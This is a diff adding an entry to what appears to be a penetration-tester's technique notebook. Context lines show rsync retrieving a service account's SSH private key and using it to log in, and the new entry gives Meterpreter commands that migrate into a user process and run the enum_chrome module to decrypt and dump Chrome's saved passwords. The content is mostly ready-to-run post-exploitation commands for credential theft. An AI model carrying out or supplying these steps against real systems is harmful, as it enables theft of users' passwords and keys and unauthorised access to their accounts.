@@ -102,3 +102,24 @@ rsync -avr rsync://svc_rsync@<TARGET>/svc_rsync ./rsyncfolder
 chmod 600 ./rsyncfolder/.ssh/id_rsa
 ssh -i ./rsyncfolder/.ssh/id_rsa svc_rsync@<TARGET>
 ```
+
+### Chrome Saved Password Extraction via Meterpreter [added: 2026-04]
+- **Tags:** #Chrome #BrowserCreds #Meterpreter #DPAPI #CredentialHarvesting #PostExploitation
+- **Trigger:** WinPEAS or manual enum shows Chrome User Data / passwords.txt; meterpreter session active
+- **Prereq:** Active Meterpreter session as the target user; Chrome installed; process migration to user's process (e.g., RuntimeBroker.exe) may be required
+- **Yields:** Decrypted Chrome saved passwords including URLs and usernames
+- **Opsec:** Low
+- **Context:** Chrome encrypts saved passwords with DPAPI masterkey tied to the user's session. Meterpreter's enum_chrome module automatically decrypts via the user's DPAPI context if running in the correct process. Process migration may be needed to match the user session.
+- **Payload/Method:**
+  ```
+  # In meterpreter session — migrate to a user process first if needed
+  ps                           # find user process (e.g. RuntimeBroker.exe)
+  migrate <PID>
+
+  background
+  use post/windows/gather/enum_chrome
+  set session <N>
+  run
+  # Decrypted output saved to /root/.msf4/loot/..._chrome.decrypted_*.txt
+  cat /root/.msf4/loot/..._chrome.decrypted_*.txt
+  ```
